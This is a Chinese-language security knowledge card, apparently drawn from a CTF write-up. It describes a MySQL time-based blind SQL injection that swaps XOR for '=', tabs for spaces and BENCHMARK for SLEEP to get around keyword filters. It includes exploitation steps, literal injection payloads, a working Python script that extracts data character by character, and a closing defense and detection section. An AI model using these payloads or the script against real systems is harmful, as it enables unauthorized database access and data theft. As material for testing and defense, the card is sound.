---
id: web-generic-sqli-xor-boolean-oracle-no-equal-sign
title: 等号被过滤时用 XOR（^）当比较运算符：if(... ^ ... , BENCHMARK) 造时间盲注 oracle
type: scenario
domain: web
path: web/generic/sqli
technique: xor-operator-boolean-oracle-equals-filter-bypass
aliases:
- 用 ^ 代替 =
- 等号过滤绕过
- XOR 布尔盲注
- funnySQL 绕过
- if(BENCHMARK) 时间盲注
tags:
- sqli
- mysql
- blind
- time-based
- waf-bypass
- operator
- xor
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:54:04+08:00'
  notes: 已对照原文核对；本次核对未读取图片；fuzz 得到的过滤项（or/sleep/handler/and/=/ascii/rand/format/%0a/空格）与正文一致，正文 payload 为 username=1^if(substr(...)%09like%09... ,BENCHMARK(5000000,md5("1")),0)%23，卡内把 ^ 作为免等号比较原语、%09 代空格、BENCHMARK 代 SLEEP 的表述与之一致；PoC 未对真实目标执行，0.5s 阈值需按环境调整
---

## 一句话结论

当注入点把 `or`、`and`、`=`、`ascii`、`rand`、`format`、`sleep`、空格、换行都过滤掉、且页面无回显时，`=` 可以用 MySQL 的 XOR 位运算符 `^` 顶上：`'^if(条件, BENCHMARK(5000000,md5("1")), 0)#` 里条件为真时执行重表达式、为假时立刻返回，于是响应耗时就是布尔 oracle；空格用 `%09`（Tab）替代、`#` 用 `%23` 或 `-- ` 收尾，即可逐字符跑出数据。

## 原理

- **`^` 是合法的布尔表达式替代**：MySQL 的 `^` 按位异或，操作数为布尔/数值时 `1^0=1`、`0^0=0`；把条件放在 `^` 右侧，`username='1' ^ <expr>` 这一项的取值就随 `<expr>` 变化，SQL 语法仍成立，不需要 `=`。
- **时间 oracle 来自 `BENCHMARK`**：`if(cond, BENCHMARK(5000000, md5('1')), 0)` 在条件成立时循环执行 500 万次 MD5（数百毫秒到数秒），否则立即返回 0；比较响应时间即可判断条件真假，不依赖任何回显或报错。
- **过滤逐项对应绕过**：
  - 空格被禁 → `%09`（Tab）在 SQL 里同样是空白分隔符；
  - `=` 被禁 → `^`（本卡核心）；
  - `and`/`or` 被禁 → 不需要，直接用 `^` 把条件接在原始比较之后；
  - `ascii`/`rand`/`format` 被禁 → 用 `substr(...) like '<c>'`，不需要 `ascii`；`BENCHMARK` 里的 `md5` 只是“昂贵表达式”，可换 `sha1`、`repeat`、笛卡尔积；
  - `sleep` 被禁 → `BENCHMARK` 替代（见关联卡）。
- **为什么用 `like` 而不是 `=`**：`like` 是等号之外的字符串比较运算符，配合 `%` 还能做前缀匹配，比 `=` 更不容易被规则命中。

## 触发条件

- 存在字符串型注入点，且被注入的表达式位置能接受算术/位运算符（`WHERE username = '1' <expr>` 这一形态）。
- 页面无回显但响应时间可测（无 WAF 的速率限制、无统一超时）。
- `BENCHMARK`（或等价重函数）未被禁用；`%09` 未被当作非法字符拦截。
- 未被预处理语句拦住（值型参数化后整条表达式无法注入）。

## 利用步骤

1. 探测过滤：依次提交 `'`、`or`、`and`、`=`、`sleep(`、` `（空格）、`%0a`，观察响应文案/状态码变化，确定黑名单。
2. 验证 `^` 可用：`username=1'^1#`（恒真）与 `username=1'^0#`（恒假），比较返回差异；无回显时直接用时间侧验证。
3. 构造时间 oracle：`1'^if(substr((select group_concat(flag) from <table>),<i>,1) like '<c>', BENCHMARK(5000000, md5("1")), 0)%23`。
4. 逐字符遍历候选集（`a-z0-9-{}`），以响应时间明显高于基线（如 >0.5s）判定命中，拼接结果。
5. 表名未知时先跑 `information_schema.tables`（或 `mysql.innodb_table_stats`），再跑列名与目标列。

## PoC

```python
import requests, string, time

url = "http://target/index.php"
result = ""
for i in range(1, 100):
    for c in string.ascii_lowercase + string.digits + "-{}":
        time.sleep(0.05)
        payload = "(select%09group_concat(flag)%09from%09Rea11ys3ccccccr3333t)"   # 表名按实际替换
        cond = f"substr({payload},{i},1)%09like%09'{c}'"
        p = f"if({cond},BENCHMARK(5000000,md5(\"1\")),0)"
        t0 = time.time()
        requests.get(f"{url}?username=1'^{p}%23")
        if time.time() - t0 > 0.5:
            result += c
            print(result)
            break
```

```sql
-- 触发后的语句形态（示意）
SELECT * FROM users WHERE username = '1' ^ if(substr((select flag from t),1,1) like 'S', BENCHMARK(5000000,md5("1")), 0) #'
```

说明：PoC 依据原文脚本整理，阈值 0.5s 需按目标机器与网络 RTT 调整（原文亦提示“可能需要根据自身网络环境调整延时”）；未对真实目标执行。

## 变体与关联

- **运算符替代族**：`^`（XOR）、`&`、`|`、`div`、`mod`、`<=>`（NULL 安全等于）、`between`、`in()`、`is`、`like`、`regexp`；不同过滤组合下可互换。
- **延时函数族**：`BENCHMARK`、`SLEEP`、`GET_LOCK`、笛卡尔积大表、正则回溯、`RLIKE` 复杂模式。
- **空白族**：`%09`、`%0a`、`%0b`、`%0c`、`%0d`、`/**/`、括号、`+`。
- **关联**：`web-generic-sqli-blind-filter-bypass-functions`（`SLEEP` 被禁时用 `BENCHMARK`/`CASE WHEN` 的通用清单）、`web-generic-sqli-dameng-dmsql-error-boolean-oob-systables`（用 `^`/`&`/`|` 把条件塞进 ORDER BY 的同类思路）、`web-generic-sqli-login-quote-escape-tab-substr-from-for-ascii-blind`（`%09` 替代空格 + 免逗号取值）。
- **边界**：`^` 两侧都是字符串时 MySQL 会做隐式数值转换，`'1' ^ 'abc'` 结果为 `1`（`abc` 转 0），可能让 oracle 恒真——需要确保条件表达式本身返回 0/1；后端为 PostgreSQL/Oracle 时 `^` 语义不同（PG 是幂运算），需换 `#`（PG 的 XOR）或 `<>`。

## 检测与防御

- **根本修复**：全部改用参数化查询；注入点若在标识符位置则用列名白名单。
- **WAF**：不要只滤 `=`/`and`/`or`/`sleep`；应在词法层识别 `^`、`&`、`|`、`like`、`BENCHMARK(`、`if(`、`substr(` 与 `%09` 空白组合，并对“同一参数高频、耗时呈二分分布”的请求做限速与告警。
- **数据库侧**：普通账号禁用 `BENCHMARK`/`SLEEP`（MySQL 8 可用 `CREATE FUNCTION` 权限控制有限，主要靠应用层），监控慢查询中重复出现的 `BENCHMARK`/`md5(` 模式。
- **检测信号**：`username` 参数含 `^`、`%09`、`%23`；同一 IP 对同一接口每秒多次请求且响应时长在 0.1s 与 1s+ 之间跳变；慢查询日志出现 `BENCHMARK(5000000`。
